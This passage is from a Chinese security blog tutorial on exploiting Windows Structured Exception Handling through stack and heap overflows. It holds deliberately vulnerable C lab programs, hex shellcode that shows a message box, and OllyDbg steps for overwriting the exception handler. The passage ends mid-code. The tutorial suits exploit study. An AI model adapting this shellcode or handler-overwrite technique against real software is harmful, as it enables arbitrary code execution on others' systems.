class="toc-number">1.1.1.</span> <span class="toc-text">S.E.H 初步了解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E5%88%A9%E7%94%A8-seh"><span class="toc-number">1.2.</span> <span class="toc-text">在栈溢出中利用 S.E.H</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81%E5%8D%B3%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">实验代码即相关介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%AD%E5%88%A9%E7%94%A8-seh"><span class="toc-number">1.3.</span> <span class="toc-text">在堆溢出中利用 S.E.H</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98-windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">深入挖掘 Windows 异常处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.</span> <span class="toc-text">其它异常处理机制的利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#veh-%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">V.E.H 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-teb-%E4%B8%AD%E7%9A%84-seh-%E5%A4%B4%E8%8A%82%E7%82%B9"><span class="toc-number">1.5.2.</span> <span class="toc-text">攻击 TEB 中的 S.E.H 头节点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBuef"><span class="toc-number">1.5.3.</span> <span class="toc-text">攻击U.E.F</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-peb-%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">1.5.4.</span> <span class="toc-text">攻击 PEB 中的函数指针</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#off-by-one-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">“off by one” 的利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-c-%E7%9A%84%E8%99%9A%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">攻击 C++ 的虚函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E5%8D%B3%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E"><span class="toc-number">3.1.</span> <span class="toc-text">实现代码即相关说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#heap-spray%E5%A0%86%E4%B8%8E%E6%A0%88%E7%9A%84%E5%8D%8F%E5%90%8C%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">Heap Spray：堆与栈的协同攻击</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-形形色色的内存攻击技术" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">形形色色的内存攻击技术</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" class="article-date"><time datetime="2022-04-23T13:09:12.000Z" itemprop="datePublished">2022-04-23</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a> </span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 7.5k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 32(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>[toc]</p><h1 id="狙击-windows-异常处理机制"><a class="markdownIt-Anchor" href="#狙击-windows-异常处理机制"></a> 狙击 Windows 异常处理机制</h1><h2 id="seh-概述"><a class="markdownIt-Anchor" href="#seh-概述"></a> S.E.H 概述</h2><p>S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418093731897.png" alt="image-20220418093731897"></p><h3 id="seh-初步了解"><a class="markdownIt-Anchor" href="#seh-初步了解"></a> S.E.H 初步了解</h3><p>S.E.H 链表：<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418095153126.png" alt="image-20220418095153126"></p><p>**设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会</p><p><strong>工作原理：</strong><br>（ 1） S.E.H 结构体<strong>存放在系统栈中</strong>。<br>（ 2）当线程初始化时，会自动向栈中安装一个 S.E.H，作为线程默认的异常处理。<br>（ 3）如果程序源代码中使用了__try{}，__except{}或者 Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个 S.E.H 来实现异常处理。<br>（ 4）栈中一般会同时存在多个 S.E.H。<br>（ 5）栈中的多个 S.E.H 通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的 S.E.H 通过 T.E.B（线程环境块） 0 字节偏移处的指针标识。<br>（ 6）当异常发生时，操作系统会中断程序，并首先从 T.E.B 的 0 字节偏移处取出距离栈顶最近的 S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>（ 7）当离“事故现场”最近的异常处理函数运行失败时，将顺着 S.E.H 链表依次尝试其他的异常处理函数。<br>（ 8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p><p><strong>利用思路：</strong><br>（ 1） <strong>S.E.H 存放在栈内</strong>，故溢出缓冲区的数据有可能淹没 S.E.H。<br>（ 2）精心制造的溢出数据可以把 S.E.H 中异常处理函数的入口地址更改为 shellcode 的起始地址。<br>（ 3）溢出后错误的栈帧或堆块数据往往会触发异常。<br>（ 4）当 Windows 开始处理溢出后的异常时，会错误地把 shellcode 当作异常处理函数而执行。</p><h2 id="在栈溢出中利用-seh"><a class="markdownIt-Anchor" href="#在栈溢出中利用-seh"></a> 在栈溢出中利用 S.E.H</h2><h3 id="实验代码即相关介绍"><a class="markdownIt-Anchor" href="#实验代码即相关介绍"></a> 实验代码即相关介绍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;<span class="comment">//200 bytes 0x90</span></span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break process for debug</span></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">		zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释：</strong><br>（ 1）函数 test 中存在典型的栈溢出漏洞，<code>strcpy()</code>函数<br>（ 2） __try{}会在 test 的函数栈帧中安装一个 S.E.H 结构。<br>（ 3） __try 中的除零操作会产生一个异常。<br>（ 4）当 strcpy 操作没有产生溢出时，除零操作的异常将最终被 MyExceptionhandler 函数<br>处理。<br>（ 5）当 strcpy 操作产生溢出，并精确地将栈帧中的 S.E.H 异常处理句柄修改为 shellcode 的<br>入口地址时，操作系统将会错误地使用 shellcode 去处理除零异常，也就是说，代码植入成功。<br>（ 6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器 attach 的方法进行调试。</p><p>**原理：**确定栈帧中 S.E.H 回调句柄的偏移，然后布置缓冲区，淹没这个句柄，将句柄修改为shellcode 的起始位置。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机与实体均可</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p>说明： Windows XP SP2 和 Windows 2003 中加入了对 S.E.H 的安全校验，因此会导致实验失败。</p></blockquote><h3 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h3><p><strong>第一步：确定 shellcode 的起始位置 和 S.E.H 回调句柄的偏移</strong></p><p>暂时将 shellcode 赋值为一段 <code>0x90</code>，运行代码，如下图所示，shellcode 的起始地址为<code>0x0012fe48</code><br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418111708935.png" alt="image-20220418111708935"></p><p>查看所有的 S.E.H 结构的位置和其注册的异常回调函数句柄，依次点击OllyDbg菜单中的 “查看” —&gt; “SEH链”<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112245646.png" alt="image-20220418112245646"><br>上图显示当前线程安装了 3 个S.E.H，当发生异常时，位于<code>0x0012ff68</code>处的 S.E.H 将第一个被调用</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112754437.png" alt="image-20220418112754437"><br><code>0x0012ff1c</code>处的指针<code>0x004017f8</code>是我们需要修改的异常回调函数句柄。</p><p><strong>第二步：组织缓冲区</strong>，把<code>0x0012ff1c</code>处的回调句柄修改成 shellcode 的起始地址 <code>0x0012fe48</code></p><p>缓冲区起始地址 <code>0x0012fe48</code>与异常句柄 <code>0x0012ff1c</code>之间共有 212 个字节的间隙。</p><p>仍然用弹出 “failwest” 消息框的 shellcode 进行测试，将不足 212 字节的部分用 <code>0x90</code>补齐。缓冲区最后的 4 个字节，即 209~212字节使用 shellcode 的起始地址<code>0x0012fe48</code>填充，来覆盖异常回调函数的句柄；最后删去中断指令__asm int 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x48\xFE\x12\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	_try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">		zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">	&#125;</span><br><span class="line">	_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下代码，弹出了 “failwest” 消息框，如下图，栈溢出成功<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418122923348.png" alt="实验结果failwest"></p><p>这时操作系统错误的使用 shellcode 去处理除零异常，从而使植入代码运行。</p><h2 id="在堆溢出中利用-seh"><a class="markdownIt-Anchor" href="#在堆溢出中利用-seh"></a> 在堆溢出中利用 S.E.H</h2><p>堆溢出发生往往同时伴随着异常产生，所以 S.E.H 通常也是堆溢出 DWORD SHOOT 的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x52\x00&quot;</span><span class="comment">//0x00520688 is the address of shellcode in first</span></span><br><span class="line"><span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line">	<span class="comment">//512 !</span></span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实验思路：</strong><br>（ 1）溢出第一个堆块的数据将写入后面的空闲堆块，在第二次堆分配时发生 DWORD SHOOT。<br>（ 2）将 S.E.H 的异常回调函数地址作为 DWORD SHOOT 的目标，将其替换为 shellcode 的入口地址，异常发生后，操作系统将错误地把 shellcode 当作异常处理函数而执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机和实体机均可。</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p><strong>说明：</strong><br>即使完全按照推荐的实验环境进行操作， S.E.H 中异常回调函数句柄的地址及 shellcode 的起始地址可能仍然需要在调试中重新确定。</p></blockquote><p><strong>第一步：找到 S.E.H 的位置 和 shellcode 的位置</strong></p><p>首先，我们把 DWORD SHOOT 最后 4 个字节的 target 设置为一个无效的内存地址，如<code>0x90909090</code>，让程序触发异常。我们所需要做的就是在程序运行时，找到 S.E.H 的位置，然后把 DWORD SHOOT 的 target 指向 S.E.H 的回调句柄。</p><p>在调试前应当确认 OllyDbg 能够捕捉所有的异常，方法是查看菜单“options”下的“debugging<br>option”中“ Exceptions”选项中没有忽略任何类型的异常，如下图所示</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418212828226.png" alt="image-20220418212828226"></p><p>然后编译运行代码，程序会自动中断，进入 OllyDbg。在寄存器 <code>EAX</code> 中，显示了HeapAlloc（）函数分配的堆的地址，即 shellcode 的起始位置，如下图所示，这里 EAX = 0x00360688<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418220922950.png" alt="image-20220418220922950"></p><p>跳过中断后，按 F9 继续运行，DWORD SHOOT 发生后，程序产生异常。OllyDbg 捕捉到异常后会自动中断，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214132858.png" alt="image-20220418214132858"></p><p>这时查看栈中 S.E.H 情况：View —&gt; SEH chain，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214323855.png" alt="image-20220418214323855"></p><p><strong>第二步：组织缓冲区</strong></p><p>发现离第一个 S.E.H 位于 <code>0x0012FEEC</code> 的地方，那么异常回调函数的句柄应该位于这个地址后 4 个字节的位置 <code>0x0012FEF0</code>。现在，将 DWORD SHOOT 的目标地址由 <code>0x90909090</code> 改为 <code>0x0012FEF0</code>，去掉程序中的中断指令，重新编译运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 